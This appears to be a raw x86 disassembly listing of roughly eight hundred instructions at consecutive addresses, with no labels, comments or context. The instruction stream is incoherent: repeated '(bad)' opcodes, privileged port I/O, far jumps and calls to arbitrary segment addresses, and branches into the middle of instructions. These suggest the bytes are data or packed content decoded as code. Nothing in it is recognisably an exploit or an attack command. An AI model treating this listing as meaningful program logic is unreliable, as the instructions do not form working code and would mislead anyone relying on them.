  4bd19e:	mov    dh,0x75
  4bd1a0:	push   0x199e3bd6
  4bd1a5:	dec    esi
  4bd1a6:	jnp    0x4bd1e9
  4bd1a8:	xchg   dl,ch
  4bd1aa:	adc    cl,BYTE PTR [edi]
  4bd1ac:	cmp    eax,0xb1d2d0be
  4bd1b1:	adc    BYTE PTR fs:[eax],dl
  4bd1b4:	cmp    BYTE PTR [eax-0x80],bl
  4bd1b7:	test   dl,0x56
  4bd1ba:	inc    edi
  4bd1bb:	imul   eax,DWORD PTR [esi+eiz*1],0x92a18401
  4bd1c2:	mov    ss,WORD PTR [ebp+0x4b38168a]
  4bd1c8:	dec    ebp
  4bd1c9:	adc    BYTE PTR [ecx],al
  4bd1cb:	lock pop eax
  4bd1cd:	dec    ebp
  4bd1ce:	mov    al,0x93
  4bd1d0:	and    BYTE PTR [edx],ch
  4bd1d2:	scas   eax,DWORD PTR es:[edi]
  4bd1d3:	push   ebx
  4bd1d4:	lock out dx,al
  4bd1d6:	push   0xc018a285
  4bd1db:	sub    eax,ecx
  4bd1dd:	jle    0x4bd248
  4bd1df:	sbb    al,0x40
  4bd1e1:	in     eax,dx
  4bd1e2:	add    DWORD PTR fs:[ecx-0x6c],ebp
  4bd1e6:	aam    0xf1
  4bd1e8:	and    al,0x1a
  4bd1ea:	or     BYTE PTR [ecx],dl
  4bd1ec:	ss ret 0x46e
  4bd1f0:	push   edx
  4bd1f1:	sub    eax,esi
  4bd1f3:	and    eax,0xe9f78640
  4bd1f8:	pop    ebx
  4bd1f9:	push   edx
  4bd1fa:	mov    DWORD PTR [edx],eax
  4bd1fc:	cmovbe ecx,ebp
  4bd1ff:	dec    eax
  4bd200:	xor    esi,DWORD PTR [ebx-0x70]
  4bd203:	adc    ecx,DWORD PTR [eax]
  4bd205:	or     BYTE PTR [esp+ecx*1],cl
  4bd208:	imul   ecx,DWORD PTR [edi+0x10102334],0x14
  4bd20f:	sub    DWORD PTR [esp+ecx*1+0x18],0x1c
  4bd214:	daa    
  4bd215:	or     DWORD PTR [edx],0x37
  4bd218:	push   cs
  4bd219:	jmp    0x6fe2:0x964cff18
  4bd220:	mov    eax,0x226054c
  4bd225:	(bad)  
  4bd226:	jp     0x4bd280
  4bd228:	xor    DWORD PTR [ecx],eax
  4bd22a:	cmp    esi,edx
  4bd22c:	push   ecx
  4bd22d:	xor    cl,BYTE PTR [eax-0x3c]
  4bd230:	jge    0x4bd26e
  4bd232:	sbb    bh,BYTE PTR [ebp+0x69]
  4bd235:	mov    al,0xee
  4bd237:	jle    0x4bd204
  4bd239:	aam    0xc7
  4bd23b:	out    0x83,eax
  4bd23d:	sahf   
  4bd23e:	ret    
  4bd23f:	loop   0x4bd21c
  4bd241:	or     bl,dh
  4bd243:	inc    ecx
  4bd244:	clc    
  4bd245:	mov    DWORD PTR [ecx],0x35de4f10
  4bd24b:	pop    edi
  4bd24c:	mov    ebp,DWORD PTR [eax]
  4bd24e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bd24f:	and    al,BYTE PTR [ecx+0x2e]
  4bd252:	dec    edx
  4bd253:	jne    0x4bd22e
  4bd255:	out    dx,eax
  4bd256:	shl    BYTE PTR [ecx],0x7b
  4bd259:	mov    al,0x14
  4bd25b:	push   si
  4bd25d:	mov    edx,0xc8185a68
  4bd262:	or     BYTE PTR [ebx],ah
  4bd264:	mov    DWORD PTR [eax],ecx
  4bd266:	retf   
  4bd267:	sar    DWORD PTR [edx+0x18d046c5],0x3b
  4bd26e:	pop    edi
  4bd26f:	mov    WORD PTR [edx-0x2],fs
  4bd272:	fst    DWORD PTR [eax+0x6d]
  4bd275:	retf   0xcc03
  4bd278:	adc    al,0x7e
  4bd27a:	test   BYTE PTR [ebp+0x2530bc2d],al
  4bd280:	(bad)  
  4bd282:	pusha  
  4bd283:	lock lds eax,FWORD PTR [eax+0x23c4eebe]
  4bd28a:	add    bh,ch
  4bd28c:	sub    eax,0xb968ef1a
  4bd291:	ss mov bh,0x2b
  4bd294:	rcl    DWORD PTR [edx+0x50],cl
  4bd297:	fadd   QWORD PTR [ecx+0x78caa7ac]
  4bd29d:	addr16 leave 
  4bd29f:	test   al,0xe
  4bd2a1:	or     BYTE PTR [eax*2+0x497a6457],0xfa
  4bd2a9:	mov    al,ds:0x1c58f848
  4bd2ae:	retf   
  4bd2af:	das    
  4bd2b0:	mov    ebp,DWORD PTR [edi]
  4bd2b2:	mov    WORD PTR [bp-0x257f],?
  4bd2b7:	mov    ah,0x93
  4bd2b9:	mov    DWORD PTR [edx+0x46],esp
  4bd2bc:	push   esi
  4bd2bd:	lea    edi,[eax+0x61]
  4bd2c0:	pop    ss
  4bd2c1:	popf   
  4bd2c2:	(bad)  
  4bd2c3:	shl    BYTE PTR [eax+0xd],cl
  4bd2c6:	pop    esp
  4bd2c7:	adc    BYTE PTR [ebx],dl
  4bd2c9:	push   eax
  4bd2ca:	mov    cl,0xc
  4bd2cc:	cmp    eax,0x36647000
  4bd2d1:	jl     0x4bd2d5
  4bd2d3:	mov    ah,0x3a
  4bd2d5:	popa   
  4bd2d6:	lock loope 0x4bd33a
  4bd2d9:	repz aam 0x44
  4bd2dc:	pop    ecx
  4bd2dd:	fsub   DWORD PTR [ecx]
  4bd2df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bd2e0:	jecxz  0x4bd2da
  4bd2e2:	fst    QWORD PTR [eax]
  4bd2e4:	xor    ebp,DWORD PTR [edx+0x6f]
  4bd2e7:	cwde   
  4bd2e8:	jp     0x4bd335
  4bd2ea:	push   0x2c2ac173
  4bd2ef:	lods   eax,DWORD PTR ds:[esi]
  4bd2f0:	add    BYTE PTR [esi+edi*1-0xb9713c0],0x5b
  4bd2f8:	call   0x6210:0x2d04bc83
  4bd2ff:	fiadd  WORD PTR [eax]
  4bd301:	loope  0x4bd36d
  4bd303:	mov    ah,0x96
  4bd305:	adc    al,0x2
  4bd307:	cld    
  4bd308:	addr16 shl ch,0xf8
  4bd30c:	push   edi
  4bd30d:	push   ebx
  4bd30e:	pop    ecx
  4bd30f:	stos   BYTE PTR es:[edi],al
  4bd310:	cmp    DWORD PTR [edi-0x5cacef78],ebp
  4bd316:	jecxz  0x4bd357
  4bd318:	cmp    edx,ebx
  4bd31a:	sbb    BYTE PTR [edx],dl
  4bd31c:	xchg   ecx,eax
  4bd31d:	adc    ebp,ecx
  4bd31f:	dec    ebp
  4bd320:	and    al,0xd8
  4bd322:	inc    ebp
  4bd323:	shl    DWORD PTR [ebp+0x4156905],cl
  4bd329:	ds dec esp
  4bd32b:	cmp    edx,eax
  4bd32d:	fs mov dh,0xf4
  4bd330:	sbb    DWORD PTR [ebx],ebp
  4bd332:	cmp    BYTE PTR [esi],cl
  4bd334:	pop    ebp
  4bd335:	imul   ecx,DWORD PTR [edx]
  4bd338:	or     esi,DWORD PTR [eax]
  4bd33a:	sub    ebp,ebp
  4bd33c:	jmp    0x4bd399
  4bd33e:	mov    ds:0x3b0190b2,al
  4bd343:	xlat   BYTE PTR ds:[ebx]
  4bd344:	nop
  4bd345:	or     DWORD PTR [esi+edi*2-0x7372a9f2],esp
  4bd34c:	add    al,0xeb
  4bd34e:	push   es
  4bd34f:	std    
  4bd350:	sbb    dl,ah
  4bd352:	js     0x4bd3d0
  4bd354:	push   ss
  4bd355:	adc    BYTE PTR [eax],cl
  4bd357:	outs   dx,BYTE PTR ds:[esi]
  4bd358:	outs   dx,DWORD PTR ds:[esi]
  4bd359:	sar    BYTE PTR [eax],cl
  4bd35b:	pop    ss
  4bd35c:	cld    
  4bd35d:	retf   
  4bd35e:	outs   dx,DWORD PTR ds:[esi]
  4bd35f:	pop    edx
  4bd360:	inc    ebx
  4bd361:	aaa    
  4bd362:	and    ebx,0x29ae240b
  4bd368:	sbb    DWORD PTR ds:0x2d7081ed,eax
  4bd36e:	aad    0x60
  4bd370:	and    al,0xd9
  4bd372:	jmp    0x4574839d
  4bd377:	(bad)
  4bd37a:	pop    ebx
  4bd37b:	in     al,0x7
  4bd37d:	inc    eax
  4bd37e:	jae    0x4bd3ad
  4bd380:	add    dl,al
  4bd382:	and    eax,0x5cbb007b
  4bd387:	xor    ah,bl
  4bd389:	lods   eax,DWORD PTR ds:[esi]
  4bd38a:	jmp    DWORD PTR [ebp+0x6ab6ed5d]
  4bd390:	adc    al,0xbb
  4bd392:	call   0x9d60183b
  4bd397:	add    DWORD PTR [ecx],esp
  4bd399:	into   
  4bd39a:	jmp    0x128b:0xc940cfde
  4bd3a1:	cmp    al,0xd5
  4bd3a3:	jl     0x4bd423
  4bd3a5:	and    BYTE PTR [edi-0x720f4feb],bl
  4bd3ab:	test   DWORD PTR [eax-0x56bf00aa],esi
  4bd3b1:	sub    ebp,ebp
  4bd3b3:	pop    esp
  4bd3b4:	mov    ebp,0x21e4a868
  4bd3b9:	xchg   ebp,eax
  4bd3ba:	scas   eax,DWORD PTR es:[edi]
  4bd3bb:	lods   eax,DWORD PTR ds:[esi]
  4bd3bc:	lods   al,BYTE PTR ds:[esi]
  4bd3bd:	sti    
  4bd3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bd3bf:	aam    0xfd
  4bd3c1:	nop
  4bd3c2:	arpl   WORD PTR [ebx],ax
  4bd3c4:	aaa    
  4bd3c5:	dec    eax
  4bd3c6:	mov    BYTE PTR [esi+eiz*4+0x3b5018d4],ch
  4bd3cd:	sbb    al,0x6d
  4bd3cf:	pusha  
  4bd3d0:	adc    BYTE PTR [esi-0x5b],0x1f
  4bd3d4:	or     al,0xeb
  4bd3d6:	add    ah,cl
  4bd3d8:	sar    ch,cl
  4bd3da:	inc    edi
  4bd3db:	fild   WORD PTR [eax+0x1ca4b63b]
  4bd3e1:	sahf   
  4bd3e2:	popf   
  4bd3e3:	sub    ebp,DWORD PTR [edx+0x0]
  4bd3e6:	jmp    0x4915:0xff5b4190
  4bd3ed:	test   BYTE PTR [edx+0x58149c34],dl
  4bd3f3:	sahf   
  4bd3f4:	inc    eax
  4bd3f5:	test   eax,0x56e4b0ca
  4bd3fa:	xor    cl,cl
  4bd3fc:	shl    BYTE PTR [ebp+0x1b386b61],0x8
  4bd403:	jmp    0x45576821
  4bd408:	arpl   WORD PTR [esi+0x7d049c0d],ax
  4bd40e:	into   
  4bd40f:	add    al,BYTE PTR [ecx+0x2e]
  4bd412:	(bad)  
  4bd413:	and    DWORD PTR [ebx+ebp*1],ebx
  4bd416:	inc    ebp
  4bd417:	cmp    al,0x61
  4bd419:	push   cs
  4bd41a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bd41b:	push   es
  4bd41c:	push   esp
  4bd41d:	jle    0x4bd445
  4bd41f:	add    bl,dh
  4bd421:	add    al,0x36
  4bd423:	daa    
  4bd424:	lea    ebp,ss:[eax+0x78]
  4bd428:	adc    DWORD PTR [ecx-0x4273c72a],0xde854c01
  4bd432:	pop    ds
  4bd433:	cmp    DWORD PTR gs:[eax-0x51],edx
  4bd437:	xor    eax,0x2d281dd7
  4bd43c:	imul   esi,DWORD PTR [esi],0xc0089101
  4bd442:	or     al,BYTE PTR [eax-0x24]
  4bd445:	fild   DWORD PTR [eax]
  4bd447:	cmp    BYTE PTR [edi-0x3f8b2477],ch
  4bd44d:	fild   WORD PTR [ebx+0x1bdd1440]
  4bd453:	push   ebx
  4bd454:	adc    dl,BYTE PTR [esi-0xf]
  4bd457:	jnp    0x4bd4d1
  4bd459:	sub    eax,eax
  4bd45b:	shl    DWORD PTR [ebp-0x3f],cl
  4bd45e:	mov    al,ds:0x6898f152
  4bd463:	call   0x9c8:0x6a682c1d
  4bd46a:	inc    edx
  4bd46b:	jno    0x4bd472
  4bd46d:	mov    al,ds:0x287e3b52
  4bd472:	sub    DWORD PTR [eax+ecx*1-0x17],eax
  4bd476:	cmp    DWORD PTR [edx+0x40],ebx
  4bd479:	sub    cl,al
  4bd47b:	pop    ebp
  4bd47c:	mov    BYTE PTR [esi],bh
  4bd47e:	add    eax,DWORD PTR [edi+0x6]
  4bd481:	stc    
  4bd482:	div    BYTE PTR [ebx+0x9]
  4bd485:	cmp    ah,BYTE PTR [edx]
  4bd487:	xor    DWORD PTR [esi],esi
  4bd489:	adc    BYTE PTR [edx-0x4215e9d2],dl
  4bd48f:	stc    
  4bd490:	mov    ah,0x5c
  4bd492:	loopne 0x4bd447
  4bd494:	or     BYTE PTR [edi*4+0x55840e1d],0x3a
  4bd49c:	dec    eax
  4bd49d:	test   eax,0x9455811a
  4bd4a2:	aaa    
  4bd4a3:	and    ebx,DWORD PTR [ecx+0x70]
  4bd4a6:	mov    ah,0xb2
  4bd4a8:	pop    DWORD PTR fs:[eax+edi*1+0x13]
  4bd4ad:	adc    BYTE PTR [ecx+eiz*2-0x39d764ea],al
  4bd4b4:	mov    ecx,0xf82d6240
  4bd4b9:	pmuludq mm3,QWORD PTR [eax+0x67b0898]
  4bd4c0:	xlat   BYTE PTR ds:[ebx]
  4bd4c1:	push   eax
  4bd4c2:	inc    eax
  4bd4c3:	sbb    bl,BYTE PTR [eax+eiz*4+0x40cd583]
  4bd4ca:	push   edx
  4bd4cb:	pop    eax
  4bd4cc:	add    dl,BYTE PTR [ebx+0x5a]
  4bd4cf:	pop    ebp
  4bd4d0:	mov    cl,0xa4
  4bd4d2:	push   edi
  4bd4d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bd4d4:	cmp    ebx,edx
  4bd4d6:	pop    ebp
  4bd4d7:	lea    edx,[ecx]
  4bd4d9:	ins    DWORD PTR es:[edi],dx
  4bd4da:	pusha  
  4bd4db:	xor    dh,BYTE PTR [edx]
  4bd4dd:	push   es
  4bd4de:	lods   eax,DWORD PTR ds:[esi]
  4bd4df:	sub    DWORD PTR [ecx-0x63d3041],esi
  4bd4e5:	pop    edx
  4bd4e6:	or     eax,0x6144e007
  4bd4eb:	dec    eax
  4bd4ec:	sbb    DWORD PTR [esi+edi*4-0x3fa9fbe6],esp
  4bd4f3:	cmp    BYTE PTR [eax],bh
  4bd4f5:	cmp    al,0xeb
  4bd4f7:	and    DWORD PTR [ebp-0x78],ebx
  4bd4fa:	les    eax,FWORD PTR [ebp-0x72aa4454]
  4bd500:	popa   
  4bd501:	arpl   WORD PTR [ecx+0x8],bp
  4bd504:	cs mov ah,0x27
  4bd507:	pop    ebp
  4bd508:	sahf   
  4bd509:	jae    0x4bd557
  4bd50b:	and    al,0x48
  4bd50d:	inc    esp
  4bd50e:	cmp    DWORD PTR [edx+0x4c],esi
  4bd511:	out    dx,eax
  4bd512:	(bad)  
  4bd513:	repz or BYTE PTR [ebx+ecx*4-0x605e981a],0xd4
  4bd51c:	in     al,0x16
  4bd51e:	mov    DWORD PTR [esi-0x6b],eax
  4bd521:	push   eax
  4bd522:	jns    0x4bd52a
  4bd524:	imul   esp,edi,0x54da5ea9
  4bd52a:	inc    esp
  4bd52b:	dec    esp
  4bd52c:	mov    al,0xa6
  4bd52e:	mov    ch,ch
  4bd530:	add    ebp,DWORD PTR [ecx+0x77]
  4bd533:	inc    ecx
  4bd534:	jo     0x4bd4f4
  4bd536:	and    DWORD PTR [ebp+0x54],eax
  4bd539:	rcr    DWORD PTR [eax+0x45],1
  4bd53c:	dec    esp
  4bd53d:	add    eax,0x3b362142
  4bd542:	pusha  
  4bd543:	pop    ebx
  4bd544:	jo     0x4bd567
  4bd546:	mov    ecx,0x6e414c5c
  4bd54b:	leave  
  4bd54c:	(bad)  
  4bd54e:	dec    ebx
  4bd54f:	add    eax,0x7c8b683d
  4bd554:	and    al,0x64
  4bd556:	xor    esi,ebp
  4bd558:	out    0xb6,eax
  4bd55a:	popa   
  4bd55b:	ret    
  4bd55c:	lods   al,BYTE PTR ds:[esi]
  4bd55d:	jmp    0x4bd5d3
  4bd55f:	push   0x28
  4bd561:	sub    al,0xf8
  4bd563:	inc    ebp
  4bd564:	add    DWORD PTR [edi+0x34],ecx
  4bd567:	pop    eax
  4bd568:	fwait
  4bd569:	imul   ebx,DWORD PTR [edx],0x1c
  4bd56c:	xor    BYTE PTR [edi+ebp*1+0x53],bh
  4bd570:	scas   eax,DWORD PTR es:[edi]
  4bd571:	dec    esp
  4bd572:	retf   
  4bd573:	adc    al,0x6
  4bd575:	ret    
  4bd576:	and    al,BYTE PTR [ebp+0x1b]
  4bd579:	cmp    esp,DWORD PTR [ecx+0x69]
  4bd57c:	mov    ds:0xf63d54e1,eax
  4bd581:	inc    esp
  4bd582:	std    
  4bd583:	rcr    BYTE PTR [ebp+0xa],1
  4bd586:	out    0x2e,eax
  4bd588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bd58a:	mov    DWORD PTR [esi],edi
  4bd58c:	adc    al,0xb
  4bd58e:	sub    DWORD PTR [ecx],ebp
  4bd590:	scas   eax,DWORD PTR es:[edi]
  4bd591:	add    ah,BYTE PTR [eax]
  4bd593:	jo     0x4bd53e
  4bd595:	sub    eax,0x53d25c80
  4bd59a:	ds leave 
  4bd59c:	xchg   edx,eax
  4bd59d:	add    BYTE PTR [edi-0x6defec7c],0x5
  4bd5a4:	xchg   ebx,eax
  4bd5a5:	pop    esi
  4bd5a6:	shl    dl,cl
  4bd5a8:	adc    BYTE PTR [esi+0x34],al
  4bd5ab:	jne    0x4bd603
  4bd5ad:	leave  
  4bd5ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bd5af:	and    esp,DWORD PTR [edx+0x4d]
  4bd5b2:	int3   
  4bd5b3:	inc    edx
  4bd5b4:	data16 in al,0xd1
  4bd5b7:	es mov dl,0x85
  4bd5ba:	enter  0xd404,0x2d
  4bd5be:	inc    esp
  4bd5bf:	cmp    DWORD PTR [ebp+edx*4+0x34eaa688],esp
  4bd5c6:	ret    
  4bd5c7:	daa    
  4bd5c8:	ins    BYTE PTR es:[edi],dx
  4bd5c9:	inc    eax
  4bd5ca:	out    0x68,al
  4bd5cc:	clc    
  4bd5cd:	adc    al,0x81
  4bd5cf:	sbb    DWORD PTR [ebp+0x11],esp
  4bd5d2:	inc    edi
  4bd5d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bd5d4:	mov    dh,BYTE PTR [eax+0x1f]
  4bd5d7:	push   esi
  4bd5d8:	and    ch,BYTE PTR [ebx]
  4bd5da:	test   BYTE PTR [ebx-0x2],dl
  4bd5dd:	sbb    ah,BYTE PTR [eax+esi*8]
  4bd5e0:	push   eax
  4bd5e1:	or     al,ah
  4bd5e3:	push   eax
  4bd5e4:	sub    edx,edi
  4bd5e6:	je     0x4bd62a
  4bd5e8:	jmp    0x4bd647
  4bd5ea:	add    DWORD PTR [edx+edi*4],0x4a
  4bd5ee:	sub    al,0x4b
  4bd5f0:	ins    DWORD PTR es:[edi],dx
  4bd5f1:	add    eax,0x6a2904b8
  4bd5f6:	and    al,0x8
  4bd5f8:	ds inc ecx
  4bd5fa:	push   edx
  4bd5fb:	mov    esp,0x2d299418
  4bd600:	sbb    esp,ebx
  4bd602:	pop    edx
  4bd603:	jmp    0x4d78947e
  4bd608:	mov    dl,0x74
  4bd60a:	sbb    ebp,DWORD PTR [ecx]
  4bd60c:	lahf   
  4bd60d:	popa   
  4bd60e:	pop    ecx
  4bd60f:	xchg   edi,eax
  4bd610:	fisubr DWORD PTR [esi]
  4bd612:	add    DWORD PTR [eax],ecx
  4bd614:	outs   dx,DWORD PTR ds:[esi]
  4bd615:	pop    ss
  4bd616:	inc    esp
  4bd617:	mov    ebp,0xff7ce0e0
  4bd61c:	push   es
  4bd61d:	xor    DWORD PTR [ebx+ebp*8+0x4c3e0189],edx
  4bd624:	add    cl,0xdd
  4bd627:	mov    esi,0x1c7fb8f8
  4bd62c:	jno    0x4bd5e0
  4bd62e:	mov    eax,ds:0x48edbc40
  4bd633:	adc    cl,BYTE PTR [ebp-0xa]
  4bd636:	push   ecx
  4bd637:	mov    ecx,0x928706a0
  4bd63c:	call   0xb5cb3352
  4bd641:	ret    
  4bd642:	mov    edx,0x4dc0392
  4bd647:	adc    DWORD PTR [eax],0x9f329ce7
  4bd64d:	mov    al,ds:0xa653af00
  4bd652:	pop    esi
  4bd653:	fisttp WORD PTR [ebx+ebx*4]
  4bd656:	xchg   DWORD PTR [eax],eax
  4bd658:	push   esi
  4bd659:	aas    
  4bd65a:	adc    dh,BYTE PTR [edx]
  4bd65c:	fbstp  TBYTE PTR [ebp+0x7e]
  4bd65f:	fisubr DWORD PTR [esi-0x20]
  4bd662:	(bad)  
  4bd663:	push   ss
  4bd664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bd665:	call   0x75c1:0xddd35d5c
  4bd66c:	or     edx,DWORD PTR [esi+0x74359f04]
  4bd672:	fs mov esi,0x9047bc40
  4bd678:	sar    bl,0x38
  4bd67b:	add    eax,0x80ab2a75
  4bd680:	mov    al,0xce
  4bd682:	xor    al,0x94
  4bd684:	and    BYTE PTR [eax-0xfb56ef5],cl
  4bd68a:	pop    esi
  4bd68b:	test   eax,0x70422e3
  4bd690:	shr    BYTE PTR [edi+eax*2-0x535fd30f],0xc
  4bd698:	fstp   DWORD PTR [eax+edx*8+0x128b406]
  4bd69f:	mov    ch,0xa
  4bd6a1:	je     0x4bd637
  4bd6a3:	lods   al,BYTE PTR ds:[esi]
  4bd6a4:	out    0xaf,eax
  4bd6a6:	inc    eax
  4bd6a7:	je     0x4bd6d0
  4bd6a9:	xlat   BYTE PTR ds:[ebx]
  4bd6aa:	and    eax,edx
  4bd6ac:	push   ebx
  4bd6ad:	pop    edx
  4bd6ae:	dec    ecx
  4bd6af:	jp     0x4bd71b
  4bd6b1:	jmp    DWORD PTR [edx]
  4bd6b3:	jne    0x4bd721
  4bd6b5:	push   ecx
  4bd6b6:	(bad)  
  4bd6b7:	jg     0x4bd6a8
  4bd6b9:	xchg   BYTE PTR [ecx],dh
  4bd6bb:	fsub   QWORD PTR [eax]
  4bd6bd:	mov    eax,ds:0x945b7c84
  4bd6c2:	cmp    esp,DWORD PTR [edi-0x4f1068c3]
  4bd6c8:	or     DWORD PTR [ecx+eax*2],ebx
  4bd6cb:	inc    edi
  4bd6cc:	jne    0x4bd6dd
  4bd6ce:	outs   dx,BYTE PTR ds:[esi]
  4bd6cf:	push   es
  4bd6d0:	sub    eax,0x6b8e5104
  4bd6d5:	dec    ebp
  4bd6d6:	xor    DWORD PTR [edi-0x71],edi
  4bd6d9:	loope  0x4bd6ec
  4bd6db:	add    BYTE PTR [edi],bl
  4bd6dd:	sti    
  4bd6de:	inc    ebp
  4bd6df:	in     al,dx
  4bd6e0:	fcomp  DWORD PTR [edx-0x12af6fcf]
  4bd6e6:	inc    edi
  4bd6e7:	fimul  DWORD PTR [edx+0x4db98565]
  4bd6ed:	pop    es
  4bd6ee:	dec    ebp
  4bd6ef:	sub    eax,0xd7eb2ac2
  4bd6f4:	jmp    0x5ca10f89
  4bd6f9:	outs   dx,BYTE PTR ds:[esi]
  4bd6fa:	shr    ebx,cl
  4bd6fc:	mov    dh,0x1c
  4bd6fe:	pop    ss
  4bd6ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bd700:	jo     0x4bd697
  4bd702:	sar    DWORD PTR [esp+eax*8],cl
  4bd705:	add    BYTE PTR [edi+0x6f],dl
  4bd708:	or     BYTE PTR [ebx],0x9a
  4bd70b:	adc    dl,BYTE PTR [edx-0x66]
  4bd70e:	pop    edx
  4bd70f:	in     eax,0x24
  4bd711:	add    ecx,DWORD PTR [edx]
  4bd713:	mov    al,0xf2
  4bd715:	mov    al,0xdf
  4bd717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bd718:	xchg   ebx,eax
  4bd719:	aad    0x2
  4bd71b:	not    DWORD PTR ss:[eax]
  4bd71e:	dec    eax
  4bd71f:	add    DWORD PTR [ecx+0x7d0242c3],ebp
  4bd725:	repnz inc esp
  4bd727:	cmp    al,0x94
  4bd729:	stos   BYTE PTR es:[edi],al
  4bd72a:	adc    al,0xf7
  4bd72c:	dec    esp
  4bd72d:	je     0x4bd6e3
  4bd72f:	(bad)  
  4bd730:	fst    st(0)
  4bd732:	call   0xb2d4:0x827733ab
  4bd739:	add    bh,BYTE PTR [esi+0x6164b490]
  4bd73f:	daa    
  4bd740:	sbb    eax,0xf88b67d9
  4bd745:	mov    bh,0xb2
  4bd747:	xor    eax,0x1398a99e
  4bd74c:	ret    0xb0c8
  4bd74f:	xchg   DWORD PTR [edx+0x283b4a13],esi
  4bd755:	xchg   DWORD PTR es:[edx+esi*2],ebx
  4bd759:	sub    al,0x18
  4bd75b:	sbb    al,0xc9
  4bd75d:	and    dl,ah
  4bd75f:	adc    cl,dh
  4bd761:	int3   
  4bd762:	pusha  
  4bd763:	add    eax,DWORD PTR [ebx+0xb27a153]
  4bd769:	das    
  4bd76a:	or     BYTE PTR [eax],0x19
  4bd76d:	test   cl,dh
  4bd76f:	rol    DWORD PTR [esi+0x57],0x2c
  4bd773:	add    esp,esp
  4bd775:	sbb    eax,0x7914440
  4bd77a:	mov    gs,WORD PTR [ebp-0x3c]
  4bd77d:	dec    esp
  4bd77e:	dec    edi
  4bd77f:	in     al,0x4d
  4bd781:	or     BYTE PTR [esi-0x22f83737],0x3d
  4bd788:	dec    edi
  4bd789:	add    BYTE PTR [edx+0x1],dh
  4bd78c:	push   0xe4302c8
  4bd791:	es int 0x54
  4bd794:	push   edx
  4bd795:	and    dl,BYTE PTR [esi+ecx*1]
  4bd798:	sbb    esi,esi
  4bd79a:	nop
  4bd79b:	adc    BYTE PTR [edx+edx*2],ah
  4bd79e:	cmp    ebp,DWORD PTR [eax]
  4bd7a0:	sub    al,0x48
  4bd7a2:	inc    ecx
  4bd7a3:	nop
  4bd7a4:	inc    ebx
  4bd7a5:	sbb    BYTE PTR [edx+0x50],dh
  4bd7a8:	adc    esp,0x3d214610
  4bd7ae:	call   0xcf09ef5b
  4bd7b3:	sti    
  4bd7b4:	rcl    BYTE PTR [eax+0x8],0xe3
  4bd7b8:	adc    cl,BYTE PTR [eax+0x1]
  4bd7bb:	adc    eax,0x538b07a0
  4bd7c0:	out    dx,eax
  4bd7c1:	cdq    
  4bd7c2:	push   0x8c291503
  4bd7c7:	outs   dx,BYTE PTR ds:[esi]
  4bd7c8:	cmp    eax,0x2c4c2c49
  4bd7cd:	add    bh,BYTE PTR [ebx]
  4bd7cf:	adc    eax,0x2d23b4e9
  4bd7d4:	pop    edx
  4bd7d5:	mov    ebp,0xcd22ac16
  4bd7da:	dec    eax
  4bd7db:	sbb    eax,edx
  4bd7dd:	adc    dh,BYTE PTR [eax+0x1000b408]
  4bd7e3:	xchg   edi,eax
  4bd7e4:	cdq    
  4bd7e5:	adc    cl,0xb2
  4bd7e8:	pop    esp
  4bd7e9:	jbe    0x4bd83b
  4bd7eb:	(bad)  
  4bd7ec:	sub    DWORD PTR [esi],eax
  4bd7ee:	sti    
  4bd7ef:	push   0x13b54025
  4bd7f4:	sbb    al,0x72
  4bd7f6:	pusha  
  4bd7f7:	mov    BYTE PTR [edx],bl
  4bd7f9:	aam    0x20
  4bd7fb:	adc    al,0xe4
  4bd7fd:	fsub   DWORD PTR [ecx]
  4bd7ff:	xchg   DWORD PTR [eax],edx
  4bd801:	and    al,0x3b
  4bd803:	sub    BYTE PTR ds:0x2c390e41,cl
  4bd809:	sbb    BYTE PTR [ecx+edx*2],ah
  4bd80c:	xchg   esi,eax
  4bd80d:	sub    al,0x1e
  4bd80f:	and    DWORD PTR [ecx-0x4f00dacb],ecx
  4bd815:	lock or esp,DWORD PTR [ebp-0x459f64ff]
  4bd81c:	or     DWORD PTR [eax-0x5d],ebx
  4bd81f:	cmp    eax,0x64989b5b
  4bd824:	not    BYTE PTR [edi]
  4bd826:	and    eax,0x5db7587d
  4bd82b:	adc    DWORD PTR [ecx],edx
  4bd82d:	sub    BYTE PTR ds:0x5d351852,ch
  4bd833:	pop    eax
  4bd834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bd835:	test   BYTE PTR [ecx+0x24bb44c2],ch
  4bd83b:	retf   0x990b
  4bd83e:	jno    0x4bd884
  4bd840:	enter  0xc3c8,0x75
  4bd844:	jne    0x4bd890
  4bd846:	mov    BYTE PTR [edx],al
  4bd848:	add    edi,0xf38b38e8
  4bd84e:	ins    DWORD PTR es:[edi],dx
  4bd84f:	dec    esp
  4bd850:	inc    esi
  4bd851:	clc    
  4bd852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bd853:	aaa    
  4bd854:	bound  eax,QWORD PTR [ecx+0x4]
  4bd857:	bndldx bnd0,[eax+0x2e]
  4bd85b:	(bad)  
  4bd85c:	test   al,0x26
  4bd85e:	les    ecx,FWORD PTR [edx]
  4bd860:	(bad)  [eax-0x48]
  4bd863:	mov    dh,0x53
  4bd865:	mov    ds:0x32096ad,eax
  4bd86a:	jae    0x4bd8df
  4bd86c:	imul   eax,DWORD PTR ds:0xa950e8a2,0xffffff9a
  4bd873:	fs push 0xf
  4bd876:	add    edi,ebx
  4bd878:	jne    0x4bd88e
  4bd87a:	inc    esp
  4bd87b:	pop    edx
  4bd87c:	hlt    
  4bd87d:	jo     0x4bd898
  4bd87f:	or     eax,0x278222a1
  4bd884:	(bad)  
  4bd885:	loope  0x4bd878
  4bd887:	aad    0x2
  4bd889:	dec    DWORD PTR [edx]
  4bd88b:	lods   al,BYTE PTR ds:[esi]
  4bd88c:	dec    ebx
  4bd88d:	adc    BYTE PTR [esi-0x30],dl
  4bd890:	mov    ch,0x69
  4bd892:	adc    ah,dl
  4bd894:	adc    al,bh
  4bd896:	lods   eax,DWORD PTR ds:[esi]
  4bd897:	cmc    
  4bd898:	mov    edx,0x4a6a4048
